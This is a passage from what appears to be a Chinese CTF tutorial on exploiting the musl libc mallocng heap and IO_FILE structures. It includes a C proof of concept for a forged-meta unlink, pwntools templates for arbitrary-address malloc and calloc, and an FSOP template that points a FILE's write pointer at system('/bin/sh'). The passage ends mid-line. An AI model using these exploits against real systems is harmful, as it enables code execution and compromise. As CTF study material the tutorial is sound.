</span><br></pre></td></tr></table></figure></div></p>
<p>之后进入 <code>free_group</code> 函数后为了减小伪造难度不再调用
<code>nontrivial_free</code> 要保证 <code>maplen</code> 不为零。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        ctx.usage_by_class[sc] -= g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">        step_seq();</span><br><span class="line">        record_seq(sc);</span><br><span class="line">        mi.base = g-&gt;mem;</span><br><span class="line">        mi.len = g-&gt;maplen * <span class="number">4096UL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">        <span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">        g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">        mi = nontrivial_free(m, idx);</span><br><span class="line">    &#125;</span><br><span class="line">    free_meta(g);</span><br><span class="line">    <span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_unlink" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_SIZE 0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_INDEX 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_INDEX 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">        <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">        <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">        <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">        <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">        <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">        <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">        <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    n = (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="type">int</span> i = (<span class="number">28</span> - __builtin_ctz(n)) * <span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i + <span class="number">1</span>]) i += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;</span><br><span class="line">    <span class="type">int</span> init_done;</span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">    <span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">uintptr_t</span> last_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable: <span class="number">1</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass: <span class="number">6</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> maplen: <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) - <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> *<span class="title">ctx</span> =</span> (<span class="keyword">struct</span> malloc_context *) (&amp;<span class="built_in">printf</span> + <span class="number">0x247193</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">target</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = ctx-&gt;secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = size_to_class(FAKE_CHUNK_SIZE - IB);</span><br><span class="line">    fake_meta-&gt;last_idx = LAST_INDEX;</span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;</span><br><span class="line">    fake_group-&gt;meta = fake_meta;</span><br><span class="line">    fake_meta-&gt;avail_mask = ((<span class="number">2U</span> &lt;&lt; LAST_INDEX) - <span class="number">1</span>) ^ (<span class="number">1</span> &lt;&lt; FAKE_CHUNK_INDEX);</span><br><span class="line">    fake_meta-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *fake_chunk = (<span class="type">uint8_t</span> *) ((<span class="type">uint64_t</span>) fake_group-&gt;storage + size_classes[fake_meta-&gt;sizeclass] * UNIT * FAKE_CHUNK_INDEX);</span><br><span class="line">    *(<span class="type">uint16_t</span> *) (fake_chunk - <span class="number">2</span>) = (fake_chunk - fake_group-&gt;storage) / UNIT;</span><br><span class="line">    fake_chunk[<span class="number">-3</span>] = FAKE_CHUNK_INDEX;</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = fake_meta-&gt;next = &amp;target;</span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line">    assert(target.prev == target.next &amp;&amp; target.prev == &amp;target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ### 任意地址 malloc（calloc） 以 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/starctf2022_BabyNote" >2022*CTF
BabyNote <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例。 伪造 <code>group</code>
，<code>meta</code>，<code>meta_area</code>，然后释放 <code>group</code>
中的 <code>chunk</code> 使 <code>meta</code> 链入 <code>active</code>
链表中。之后反复释放和申请 <code>meta</code> 所在 <code>chunk</code>
并修改 <code>meta</code> 中的 <code>mem</code> 指向就可以达到任意地址
<code>malloc</code> 的效果。 注意 <code>enframe</code>
函数中有如下检查，因此需要申请的 <code>fake chunk</code>
的前面对应位置应该为 0 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assert(!p[<span class="number">-4</span>]);</span><br></pre></td></tr></table></figure></div> 模板如下： <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_name_addr = libc.address + <span class="number">0xb7990</span></span><br><span class="line">fake_meta_area_addr = libc.address - <span class="number">0x6000</span></span><br><span class="line">fake_meta_addr = fake_meta_area_addr + <span class="number">0x8</span></span><br><span class="line">fake_group_addr = elf.address + <span class="number">0x4b90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr).ljust(<span class="number">0x28</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = (<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0xfe0</span> + p64(leak_secret) + fake_meta).ljust(<span class="number">0x2000</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(fake_name_addr)  <span class="comment"># name_addr</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># content_addr</span></span><br><span class="line">fake_node += p64(<span class="built_in">len</span>(<span class="string">&#x27;fake name&#x27;</span>))  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># content_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># next</span></span><br></pre></td></tr></table></figure></div> 对于
calloc 函数，定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> m, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n &amp;&amp; m &gt; (<span class="type">size_t</span>) <span class="number">-1</span> / n) &#123;</span><br><span class="line">        errno = ENOMEM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    n *= m;</span><br><span class="line">    <span class="type">void</span> *p = <span class="built_in">malloc</span>(n);</span><br><span class="line">    <span class="keyword">if</span> (!p || (!__malloc_replaced &amp;&amp; __malloc_allzerop(p)))</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    n = mal0_clear(p, n);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memset</span>(p, <span class="number">0</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> is_allzero __malloc_allzerop</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_allzero</span><span class="params">(<span class="type">void</span> *p)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">    <span class="keyword">return</span> g-&gt;sizeclass &gt;= <span class="number">48</span> ||</span><br><span class="line">           get_stride(g) &lt; UNIT * size_classes[g-&gt;sizeclass];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在调用完 <code>malloc</code> 之后如果 <code>__malloc_replaced</code>
为 0 则会调用 <code>__malloc_allzerop</code> 函数，该函数会调用
<code>get_meta</code> ，在 <code>get_meta</code>
函数中有大量检查，因此如果要用 <code>calloc</code> 实现任意地址
<code>malloc</code> 需要先将 <code>__malloc_replaced</code> 改为非 0
。</p>
<p>在 <code>enframe</code> 函数中会设置申请的 <code>chunk</code>
的头部信息。因此只要通过伪造 <code>meta</code> 使得对应字段不为 0
且该字段会覆写 <code>__malloc_replaced</code> 从而在第一次任意地址
<code>malloc</code> 修改 <code>__malloc_replaced</code> 为非 0 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">*(<span class="type">uint16_t</span> *) (p - <span class="number">2</span>) = (<span class="type">size_t</span>) (p - g-&gt;mem-&gt;storage) / UNIT;</span><br><span class="line">p[<span class="number">-3</span>] = idx;</span><br></pre></td></tr></table></figure></div> 模板如下： <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">malloc_replaced_addr = libc.address + <span class="number">0xb6f84</span></span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_meta_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(malloc_replaced_addr - <span class="number">0x80</span> - <span class="number">0x20</span> + <span class="number">4</span>)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b10</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = (<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0xfd0</span> + p64(leak_secret) + fake_meta).ljust(<span class="number">0x2000</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure></div> ### 堆风水 这里以 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/starctf2022_BabyNote" >*CTF
2022 BabyNote <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例 感受一下。</p>
<p>图中绿色表示 <code>Available</code> ，红色表示 <code>Freed</code>
，白色表示 <code>Inuse</code> 。</p>
<p>这里假设 <code>A</code> 为 <code>node</code> ，<code>B</code> 为
<code>name</code> ，<code>C</code> 为 <code>content</code> ，考虑 0x30
的 <code>active</code> 。</p>
<p>首先构造如下堆排布：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/455bc0063b0d2e9ac657215d1e12c878.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<p>释放第一个 <code>node</code> 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3cd624e124e8074f35fcccb9c40b2b76.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
再次创建一个 <code>node</code>，由于优先分配 <code>Available</code>
状态的 <code>chunk</code> 因此 <code>A</code> 和 <code>C</code>
顺序与正常情况相反。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/281bc1efb8c0cdc957333889341d594f.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
因为只有链表头不直接相连的 <code>node</code> 才能
uaf，因此需要先填满第二个 <code>group</code> 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4f7ac7943d86eb3a85243e93cacc9738.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
之后释放前面 <code>A</code> <code>C</code> 顺序相反的 <code>node</code>
。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9880625f7344eb160ffffce26f60dd0a.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
再次申请一个 <code>node</code> 此时可以利用 uaf 泄露 libc 和 elf 基址。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e17a43031d0f4552b38e01968353b0fa.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
由于相关基址已经泄露，可以通过堆风水 uaf 伪造 <code>node</code>
节点实现任意地址读和伪造 unlink 相关结构。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2f1da91fac6155dcc94cf59859b53c4f.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<h1 id="io_file">IO_FILE</h1>
<h2 id="io_file-结构体">_IO_FILE 结构体</h2>
<p>musl 中的 <code>_IO_FILE</code> 结构体定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
其中有 4 个函数指针 <code>close</code> 、<code>read</code>
、<code>write</code> 、<code>seek</code>
。在解题时，标准输入输出的三个FILE结构体：<code>stdin</code>、<code>stdout</code>、<code>stderr</code>是我们利用的重点。</p>
<h2 id="fsop">FSOP</h2>
<h3 id="exit-调用链">exit 调用链</h3>
<p>分析 <code>exit</code> 函数的调用链，发现最终会调用 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="keyword">volatile</span> __stdin_used = &amp;__stdin_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stdout_used = &amp;__stdout_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stderr_used = &amp;__stderr_FILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">    __funcs_on_exit();</span><br><span class="line">    __libc_exit_fini();</span><br><span class="line">    __stdio_exit();</span><br><span class="line">    _Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>) &#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">for</span> (f = *__ofl_lock(); f; f = f-&gt;next) close_file(f);</span><br><span class="line">    close_file(__stdin_used);</span><br><span class="line">    close_file(__stdout_used);</span><br><span class="line">    close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">    FFINALLOCK(f);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos - f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
可以看到 <code>close_file</code> 中可能会调用三个 FILE 的
<code>write</code> 和 <code>seek</code>
函数指针。我们要修改的也正是这两个指针。在没有沙箱的情况下，只需要将
FILE 结构体开头的几个字节修改为 <code>/bin/sh</code> ，再修改
<code>write</code> 指针的值为 <code>system</code> ，以及修改
<code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code>
中其中之一就可以调用到 <code>system("/bin/sh")</code> 。</p>
<p>总结来说，就是在无沙箱时，需要修改 <code>_IO_FILE</code>
结构体的几个地方： - 起始位置写入 <code>/bin/sh</code> -
<code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code>
中其中之一使得二者不等 - <code>write</code> 写入 <code>system</code>
函数地址。 - 最好将 <code>lock</code> 设置为小于 0 避免程序卡死在
<code>__lockfile</code> 函数中。（等于 0 貌似也可以） <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">    FFINALLOCK(f);</span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FFINALLOCK(f) ((f)-&gt;lock &gt;= 0 ? __lockfile((f)) : 0)</span></span><br><span class="line">替换:  </span><br><span class="line">((f)-&gt;lock &gt;= <span class="number">0</span> ? __lockfile((f)) : <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
常用模板如下： <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_file = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x1919810</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br></pre></td></tr></table></figure></div> 对于 musl-1.2.1
及以上版本，结合相关结构的伪造，模板如下（<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/qwb2022_UserManager" >2022强网杯UserManager <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span 